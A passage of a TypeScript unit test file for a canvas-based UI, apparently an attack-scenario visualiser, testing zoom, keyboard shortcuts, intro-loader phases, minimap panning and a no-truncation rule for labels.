    assert.equal(touchSelect.useCanvasPan, false);

    const shiftLeftHold = resolveCanvasHoldInteractionMode({
      button: 0,
      shiftKey: true,
    });
    assert.equal(shiftLeftHold.mode, 'SELECT');
    assert.equal(shiftLeftHold.useMarqueeSelection, true);
    assert.equal(shiftLeftHold.useCanvasPan, false);
  });

  it('intro-loader-sequence orchestrates 4-phase minimal anime game-style loading progression, module readiness ticks, and ?autostart=1 bypass', async () => {
    const {
      clampIntroProgress,
      formatIntroProgressPct,
      resolveIntroPhase,
      computeIntroSequenceState,
      shouldSkipIntroFromSearch,
    } = await import('./intro-loader-sequence');

    // 1. Progress clamping & tabular percentage formatting
    assert.equal(clampIntroProgress(-12), 0);
    assert.equal(clampIntroProgress(42.4), 42);
    assert.equal(clampIntroProgress(145), 100);
    assert.equal(formatIntroProgressPct(0), '00%');
    assert.equal(formatIntroProgressPct(7), '07%');
    assert.equal(formatIntroProgressPct(100), '100%');

    // 2. 4-Phase sequence progression
    assert.equal(resolveIntroPhase(0).id, 'INK_SYNTHESIS');
    assert.equal(resolveIntroPhase(35).id, 'VECTOR_THRUST');
    assert.equal(resolveIntroPhase(72).id, 'TELEMETRY_SYNC');
    assert.equal(resolveIntroPhase(98).id, 'READY_BURST');

    // 3. Choreographed anime emblem states & subsystem readiness
    const s0 = computeIntroSequenceState(0);
    assert.equal(s0.mechaWingsDeployed, false);
    assert.equal(s0.spearheadSlashed, false);
    assert.equal(s0.hikariFlareActive, false);
    assert.equal(s0.wordmarkLocked, false);
    assert.equal(s0.isComplete, false);
    assert.ok(s0.modules.every((m) => !m.isReady));

    const s55 = computeIntroSequenceState(55);
    assert.equal(s55.mechaWingsDeployed, true);
    assert.equal(s55.spearheadSlashed, true);
    assert.equal(s55.hikariFlareActive, true);
    assert.equal(s55.wordmarkLocked, false);
    assert.equal(s55.modules[0].isReady, true);
    assert.equal(s55.modules[1].isReady, true);
    assert.equal(s55.modules[2].isReady, false);

    const s100 = computeIntroSequenceState(100);
    assert.equal(s100.isComplete, true);
    assert.equal(s100.wordmarkLocked, true);
    assert.ok(s100.modules.every((m) => m.isReady));

    // 4. ?autostart=1 and ?skipIntro=1 query parameter detection
    assert.equal(shouldSkipIntroFromSearch(''), false);
    assert.equal(shouldSkipIntroFromSearch('?foo=bar'), false);
    assert.equal(shouldSkipIntroFromSearch('?autostart=1'), true);
    assert.equal(shouldSkipIntroFromSearch('?skipIntro=true'), true);
  });

  it('computeScrollWheelZoom zooms gradually (~5% per notch) and never jumps directly to min/max bounds on a single wheel event', async () => {
    const {
      computeScrollWheelZoom,
      MIN_CANVAS_ZOOM,
      MAX_CANVAS_ZOOM,
    } = await import('./canvas-interaction-engine');

    // Single wheel down (zoom out) from 1.00 -> ~0.95 (never 0.45)
    const zoomOutOneStep = computeScrollWheelZoom(1, 100);
    assert.equal(zoomOutOneStep, 0.95);
    assert.ok(zoomOutOneStep > MIN_CANVAS_ZOOM);

    // Single wheel up (zoom in) from 1.00 -> ~1.052 (never 2.50)
    const zoomInOneStep = computeScrollWheelZoom(1, -100);
    assert.equal(zoomInOneStep, 1.052);
    assert.ok(zoomInOneStep < MAX_CANVAS_ZOOM);

    // Even an extreme deltaY spike (e.g. 1200) is clamped to a gentle step
    const extremeSpikeOut = computeScrollWheelZoom(1, 1200);
    assert.equal(extremeSpikeOut, 0.95);
  });

  it('keyboard-shortcuts catalog and hotkey resolver map B to Box Select, P to Pan/Pen, and canvas navigation keys accurately', async () => {
    const {
      KEYBOARD_SHORTCUT_ITEMS,
      SHORTCUT_CATEGORIES,
      filterKeyboardShortcuts,
      isEditableKeyboardTarget,
      resolveKeyboardShortcutCommand,
      KEYBOARD_PAN_STEP_PX,
    } = await import('./keyboard-shortcuts');

    assert.equal(SHORTCUT_CATEGORIES.length, 4);
    assert.ok(KEYBOARD_SHORTCUT_ITEMS.length >= 16);
    assert.equal(KEYBOARD_PAN_STEP_PX, 48);

    // 1. Verify B -> Box Select and P -> Pan Page / Pen
    assert.equal(resolveKeyboardShortcutCommand({ key: 'b' }), 'TOOL_BOX_SELECT');
    assert.equal(resolveKeyboardShortcutCommand({ key: 'B' }), 'TOOL_BOX_SELECT');
    assert.equal(resolveKeyboardShortcutCommand({ key: 'p' }), 'TOOL_PAN_PAGE');
    assert.equal(resolveKeyboardShortcutCommand({ key: 'P' }), 'TOOL_PAN_PAGE');
    assert.equal(resolveKeyboardShortcutCommand({ key: 'h' }), 'TOOL_PAN_PAGE');

    // 2. Verify Zoom, Reset, and Directional Panning
    assert.equal(resolveKeyboardShortcutCommand({ key: '+' }), 'ZOOM_IN');
    assert.equal(resolveKeyboardShortcutCommand({ key: '=' }), 'ZOOM_IN');
    assert.equal(resolveKeyboardShortcutCommand({ key: '-' }), 'ZOOM_OUT');
    assert.equal(resolveKeyboardShortcutCommand({ key: '0' }), 'RESET_CANVAS');
    assert.equal(resolveKeyboardShortcutCommand({ key: 'r' }), 'RESET_CANVAS');
    assert.equal(resolveKeyboardShortcutCommand({ key: 'ArrowUp' }), 'PAN_UP');
    assert.equal(resolveKeyboardShortcutCommand({ key: 'ArrowDown' }), 'PAN_DOWN');
    assert.equal(resolveKeyboardShortcutCommand({ key: 'ArrowLeft' }), 'PAN_LEFT');
    assert.equal(resolveKeyboardShortcutCommand({ key: 'ArrowRight' }), 'PAN_RIGHT');

    // 3. Verify Toggles & Help Overlay
    assert.equal(resolveKeyboardShortcutCommand({ key: 'c' }), 'TOGGLE_AUTOCAM');
    assert.equal(resolveKeyboardShortcutCommand({ key: 't' }), 'TOGGLE_TACTICAL');
    assert.equal(resolveKeyboardShortcutCommand({ key: 'l' }), 'TOGGLE_LEGEND');
    assert.equal(
      resolveKeyboardShortcutCommand({ key: '?' }),
      'TOGGLE_SHORTCUTS_HELP'
    );
    assert.equal(
      resolveKeyboardShortcutCommand({ key: 'a', ctrlKey: true }),
      'SELECT_ALL_NODES'
    );
    assert.equal(resolveKeyboardShortcutCommand({ key: 'Escape' }), 'ESCAPE');

    // 4. Ignore single-key hotkeys when typing in INPUT or TEXTAREA
    assert.equal(isEditableKeyboardTarget('INPUT', false), true);
    assert.equal(isEditableKeyboardTarget('TEXTAREA', false), true);
    assert.equal(isEditableKeyboardTarget('DIV', false), false);
    assert.equal(
      resolveKeyboardShortcutCommand({ key: 'b', targetTagName: 'INPUT' }),
      null
    );

    // 5. Filtering by category and search query
    const toolShortcuts = filterKeyboardShortcuts('', 'TOOLS_SELECTION');
    assert.ok(toolShortcuts.some((s) => s.id === 'TOOL_BOX_SELECT'));
    assert.ok(toolShortcuts.some((s) => s.id === 'TOOL_PAN_PAGE'));

    const boxSearch = filterKeyboardShortcuts('Box Select', 'ALL');
    assert.ok(boxSearch.length >= 1);
    assert.equal(boxSearch[0].id, 'TOOL_BOX_SELECT');
    assert.equal(resolveKeyboardShortcutCommand({ key: 'm' }), null);
  });

  it('computeMinimapViewportRect, computePanFromMinimapPoint, and Zero-Truncation UI standards work accurately and forbid ellipsis in active UI components', async () => {
    const {
      computeMinimapViewportRect,
      computePanFromMinimapPoint,
    } = await import('./canvas-interaction-engine');
    const {
      formatConciseStagePillLabel,
      formatConciseInternalFlowPill,
      ZERO_TRUNCATION_STANDARD,
    } = await import('./ui-text-standards');
    const fs = await import('node:fs');
    const path = await import('node:path');

    // 1. Minimap viewport rectangle math at 1x and zoomed/panned states
    const rect1x = computeMinimapViewportRect({
      panX: 0,
      panY: 0,
      zoomScale: 1,
    });
    assert.equal(rect1x.x, 0);
    assert.equal(rect1x.y, 0);
    assert.equal(rect1x.width, 1480);
    assert.equal(rect1x.height, 650);

    const rect2x = computeMinimapViewportRect({
      panX: -200,
      panY: -100,
      zoomScale: 2,
      containerWidth: 1000,
      containerHeight: 500,
    });
    assert.ok(rect2x.width < 1480);
    assert.ok(rect2x.height < 650);
    assert.ok(rect2x.x > 0);
    assert.ok(rect2x.y > 0);

    // 2. Minimap click-to-pan centers the clicked whiteboard coordinate
    const centerPan = computePanFromMinimapPoint({
      targetWx: 740,
      targetWy: 325,
      zoomScale: 1,
      containerWidth: 1000,
      containerHeight: 500,
    });
    assert.equal(centerPan.x, 0);
    assert.equal(centerPan.y, 0);

    const topLeftPan = computePanFromMinimapPoint({
      targetWx: 0,
      targetWy: 0,
      zoomScale: 1,
      containerWidth: 1000,
      containerHeight: 500,
    });
    assert.equal(topLeftPan.x, 500);
    assert.equal(topLeftPan.y, 250);

    // 3. Concise stage pills & internal flow pills never contain '...'
    assert.equal(ZERO_TRUNCATION_STANDARD.forbidEllipsisOnCardsAndPills, true);
    for (const scenario of ATTACK_SCENARIOS) {
      for (const stage of scenario.stages) {
        const pill = formatConciseStagePillLabel(stage);
        assert.ok(pill.shortLabel.length > 0 && pill.shortLabel.length <= 36);
        assert.equal(
          pill.shortLabel.includes('...'),
          false,
          `Stage pill "${pill.shortLabel}" must never contain '...'`
        );
        assert.ok(pill.tooltipTitle.includes(stage.title));
      }
    }

    const flowPill = formatConciseInternalFlowPill({
      sequenceCode: '1.1',
      forwardSeq: '1.1.1',
      returnSeq: '1.1.2',
      label: 'Dispatch Request to Engine',
      returnLabel: 'RESP SESSION_OPEN',
    });
    assert.equal(flowPill.codeBadge, '#1.1');
    assert.equal(flowPill.shortRoute, '(1.1.1→ · ⇠1.1.2)');
    assert.equal(flowPill.shortRoute.includes('...'), false);
    assert.ok(flowPill.tooltipDetail.includes('Dispatch Request to Engine'));

    // 4. Permanent Zero-Truncation guard on active UI components
    const zeroTruncateFiles = [
      'components/AttackStepProgressBar.tsx',
      'components/AttackSidebar.tsx',
      'components/AttackVisualizer.tsx',
      'components/DraggableDiagramNode.tsx',
      'components/InspectorPanel.tsx',
      'components/MitreStats.tsx',
      'components/ThreatIntelCard.tsx',
      'components/canvas/ProcessMemoryView.tsx',
      'components/canvas/SequenceView.tsx',
      'components/canvas/RawTablesView.tsx',
    ];
    for (const relPath of zeroTruncateFiles) {
      const fullPath = path.join(process.cwd(), relPath);
      const source = fs.readFileSync(fullPath, 'utf8');
      assert.equal(
        /\btruncate\b/.test(source),
        false,
        `${relPath} must not contain CSS 'truncate' class (violates Zero-Truncation Standard)`
      );
    }
  });
});
